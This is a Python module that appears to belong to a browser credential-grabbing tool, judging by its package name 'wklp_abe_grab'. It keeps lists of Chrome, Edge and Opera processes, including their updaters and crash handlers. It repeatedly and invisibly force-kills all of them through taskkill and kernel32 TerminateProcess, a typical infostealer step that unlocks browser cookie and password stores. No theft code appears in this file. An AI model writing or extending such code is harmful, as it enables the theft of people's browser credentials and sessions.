import subprocess
import time

from wklp_abe_grab.winapi import (
    CREATE_NO_WINDOW,
    PROCESS_TERMINATE,
    k32,
)

BROWSER_PROCESSES = {
    "chrome": [
        "chrome.exe", "chrome_proxy.exe", "chrome_pwa_launcher.exe",
        "GoogleUpdate.exe", "GoogleCrashHandler.exe",
        "GoogleCrashHandler64.exe", "chrome_crashpad_handler.exe",
        "elevation_service.exe", "software_reporter_tool.exe",
    ],
    "edge": [
        "msedge.exe", "msedge_proxy.exe", "msedge_pwa_launcher.exe",
        "MicrosoftEdgeUpdate.exe", "MicrosoftEdgeUpdateBroker.exe",
        "msedgewebview2.exe", "MicrosoftEdgeCP.exe",
        "MicrosoftEdgeSH.exe", "identity_helper.exe",
    ],
    "opera": [
        "opera.exe", "opera_crashreporter.exe",
        "opera_autoupdate.exe", "launcher.exe",
    ],
    "opera_gx": [
        "opera.exe", "opera_gx.exe", "opera_crashreporter.exe",
        "opera_autoupdate.exe", "launcher.exe",
    ],
}


def _list_matching_pids(targets):
    try:
        out = subprocess.check_output(
            ["tasklist", "/fo", "csv", "/nh"],
            shell=False, timeout=10, creationflags=CREATE_NO_WINDOW,
        ).decode(errors="ignore")
    except Exception:
        return []
    lower = {t.lower() for t in targets}
    pids = []
    for line in out.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.strip('"').split('","')
        if len(parts) < 2:
            continue
        name = parts[0].lower()
        try:
            pid = int(parts[1])
        except ValueError:
            continue
        if name in lower:
            pids.append((pid, name))
    return pids


def kill_browser_processes(browser):
    targets = BROWSER_PROCESSES.get(browser, [])
    if not targets:
        return
    for round_num in range(3):
        killed_any = False
        for img in targets:
            r = subprocess.run(
                ["taskkill", "/F", "/T", "/IM", img],
                shell=False, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL, creationflags=CREATE_NO_WINDOW,
            )
            if r.returncode == 0:
                killed_any = True
        pids = _list_matching_pids(targets)
        if pids:
            killed_any = True
            for pid, _ in pids:
                subprocess.run(
                    ["taskkill", "/F", "/PID", str(pid)],
                    shell=False, stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL, creationflags=CREATE_NO_WINDOW,
                )
        if not killed_any and round_num > 0:
            break
        time.sleep(0.6)
    remaining = _list_matching_pids(targets)
    if remaining:
        for pid, _ in remaining:
            h = k32.OpenProcess(PROCESS_TERMINATE, False, pid)
            if h:
                k32.TerminateProcess(h, 0)
                k32.CloseHandle(h)
    time.sleep(1.5)